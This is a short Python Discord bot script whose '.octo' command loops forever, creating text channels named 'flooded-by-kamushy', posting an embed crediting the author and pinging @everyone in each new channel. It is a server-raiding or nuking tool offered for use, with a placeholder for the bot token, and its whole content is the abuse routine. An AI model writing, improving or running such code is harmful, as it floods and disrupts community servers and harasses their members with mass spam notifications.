import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".")

@client.command()
async def octo(ctx):
    guild = ctx.guild
    
    await ctx.send(file=discord.File(r''))
    while 1 == 1:
        channel = await guild.create_text_channel('flooded-by-kamushy')

        em = discord.Embed(title = "Nillumocto", description = "\n", color=0x0ff41)
        em.add_field(name="Nillumocto", value="Flooded by kamushy#0992" )
        await channel.send(embed = em)
        await channel.send("@everyone")


    

    
    
    
    
    
             

















             
client.run('add your token here')
